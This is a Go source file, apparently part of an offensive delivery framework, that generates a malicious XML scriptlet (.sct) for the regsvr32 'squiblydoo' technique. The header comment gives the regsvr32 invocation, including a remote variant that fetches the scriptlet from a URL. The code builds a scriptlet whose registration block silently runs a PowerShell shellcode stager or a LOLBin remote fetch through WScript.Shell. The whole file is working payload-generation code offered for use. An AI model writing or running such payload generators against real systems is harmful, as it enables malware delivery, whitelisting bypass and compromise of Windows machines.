// sct.go — emit an XML Scriptlet (.sct). Delivered via regsvr32 squiblydoo:
// `regsvr32 /s /u /i:<payload.sct> scrobj.dll` (or `--url <http://host/payload.sct>`
// for the remote variant where the SCT itself is fetched by regsvr32). The
// scriptlet's <registration> block runs JScript on load — we use it to launch
// the inline powershell stager (inline mode) or a LOLBin fetch (remote mode).
package delivery

import "strings"

type sctEmitter struct{}

func (sctEmitter) Name() string { return "sct" }
func (sctEmitter) Ext() string  { return "sct" }

func (sctEmitter) Emit(s *Spec) ([]Artifact, error) {
	var cmd string
	switch {
	case s.Remote():
		cmd = lolbinRemote(s.Launcher, s.URL)
	case len(s.Shellcode) > 0:
		cmd = launcherInlineCmd(s.Shellcode)
	default:
		return nil, errPayloadRequired("sct")
	}
	body := sctBody(cmd)
	return []Artifact{writeFile("payload.sct", []byte(body))}, nil
}

// sctBody renders a minimal scriptlet whose registration script runs `cmd`.
func sctBody(cmd string) string {
	var b strings.Builder
	b.WriteString(`<?xml version="1.0"?>` + "\n")
	b.WriteString("<scriptlet>\n")
	b.WriteString(`<registration progid="Shroud.Sct" description="x">` + "\n")
	b.WriteString(`<script language="JScript">` + "\n")
	b.WriteString("<![CDATA[\n")
	b.WriteString("var s = new ActiveXObject(\"WScript.Shell\");\n")
	b.WriteString("s.Run(\"" + jsEscape(cmd) + "\", 0, false);\n")
	b.WriteString("]]>\n")
	b.WriteString("</script>\n")
	b.WriteString("</registration>\n")
	b.WriteString("</scriptlet>\n")
	return b.String()
}